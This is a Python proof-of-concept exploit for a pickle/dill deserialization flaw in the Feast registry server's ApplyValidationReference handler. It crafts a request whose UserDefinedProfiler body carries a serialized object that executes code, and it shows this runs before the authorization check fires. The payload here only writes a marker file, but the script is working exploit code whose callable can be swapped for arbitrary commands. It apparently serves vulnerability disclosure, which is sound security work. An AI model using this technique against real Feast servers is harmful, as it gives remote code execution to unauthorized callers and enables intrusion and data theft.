#!/usr/bin/env python3
"""
PoC 2 — The deserialization happens BEFORE authorization.

This isolates the root cause and shows the bug is not merely "the default
no_auth config is unauthenticated". It demonstrates that on a server with auth
ENABLED, a caller who is authenticated but NOT authorized to create/update the
resource (i.e. assert_permissions_to_update would reject them) STILL triggers
code execution, because `ValidationReference.from_proto(request.validation_reference)`
is evaluated as an argument expression before `assert_permissions_to_update`
ever runs.

We call the real, unmodified `RegistryServer.ApplyValidationReference` handler
(HEAD source) and replace `assert_permissions_to_update` with a function that
raises FeastPermissionError, exactly as it would for an unauthorized principal.
The malicious payload fires anyway, and the denial arrives only afterwards.

This is the same vulnerability class as CVE-2026-34070 / CVE-2026-56121
(deserialize-before-authorize on the registry server). The fix applied to
ApplyFeatureView — parse a metadata-only object with `skip_udf=True` before the
permission check — was never extended to ApplyValidationReference.

Run:
    PYTHONPATH=<repo>/sdk/python  ./venv/bin/python poc_preauth_ordering.py
"""

import os
import sys
import tempfile

import dill

import feast  # noqa: F401  (asserts HEAD source is on the path)
from feast import registry_server
from feast.registry_server import RegistryServer
from feast.errors import FeastPermissionError
from feast.protos.feast.registry import RegistryServer_pb2
from feast.protos.feast.core.ValidationProfile_pb2 import (
    GEValidationProfiler,
    ValidationReference as ValidationReferenceProto,
)

MARKER = os.path.join(tempfile.gettempdir(), f"feast_preauth_marker_{os.getpid()}")
EVENTS: list[str] = []


class _Evil:
    def __reduce__(self):
        # Pure in-process side effect so ordering is unambiguous (no shell race).
        return (_record_exec, ("PAYLOAD_EXECUTED",))


def _record_exec(tag: str):
    EVENTS.append(tag)
    with open(MARKER, "w") as fh:
        fh.write(tag + "\n")
    return tag


class _DummyRegistry:
    """Provides the attributes the handler references while assembling the
    assert_permissions_to_update(...) call. None of these methods is invoked —
    the payload runs during `resource=ValidationReference.from_proto(...)`, which
    is evaluated before the (denying) authz function body runs."""

    def get_validation_reference(self, *a, **k):
        EVENTS.append("GETTER_INVOKED")
        raise AssertionError("getter must not actually be invoked")

    def apply_validation_reference(self, *a, **k):
        raise AssertionError("apply must not be reached")


def _denying_assert_permissions_to_update(resource, getter, project, allow_cache=True):
    """Stand-in for an authenticated-but-unauthorized caller: deny every update.
    Records when the authz check is reached, so we can prove it runs AFTER the
    payload."""
    EVENTS.append("AUTHZ_CHECK_REACHED")
    raise FeastPermissionError("permission denied (simulated: unauthorized principal)")


def build_request():
    payload = dill.dumps(_Evil(), recurse=False)
    vr = ValidationReferenceProto(
        name="pwn",
        reference_dataset_name="anything",
        ge_profiler=GEValidationProfiler(
            profiler=GEValidationProfiler.UserDefinedProfiler(body=payload)
        ),
    )
    return RegistryServer_pb2.ApplyValidationReferenceRequest(
        validation_reference=vr, project="demo", commit=False
    )


def main() -> int:
    print(f"[i] feast source under test: {feast.__file__}")

    # Patch the authz gate to DENY, as it would for an unauthorized user.
    registry_server.assert_permissions_to_update = _denying_assert_permissions_to_update

    if os.path.exists(MARKER):
        os.remove(MARKER)

    servicer = RegistryServer(registry=_DummyRegistry(), store=None)
    req = build_request()

    print("[i] invoking ApplyValidationReference as an UNAUTHORIZED caller "
          "(authz will deny) ...")
    denied = False
    try:
        servicer.ApplyValidationReference(req, context=None)
    except FeastPermissionError as e:
        denied = True
        print(f"[i] authorization denied: {e}")

    print(f"\n[i] event order observed: {EVENTS}")

    payload_ran = "PAYLOAD_EXECUTED" in EVENTS
    ran_before_authz = (
        payload_ran
        and "AUTHZ_CHECK_REACHED" in EVENTS
        and EVENTS.index("PAYLOAD_EXECUTED") < EVENTS.index("AUTHZ_CHECK_REACHED")
    )

    if payload_ran and denied and ran_before_authz:
        print("\n*** CONFIRMED — attacker code executed BEFORE the authorization "
              "check, and the caller was still denied afterwards. ***")
        print("    => any authenticated-but-unauthorized principal gets RCE, "
              "regardless of granted permissions.")
        return 0
    print("\n[x] ordering not reproduced as expected")
    return 1


if __name__ == "__main__":
    sys.exit(main())
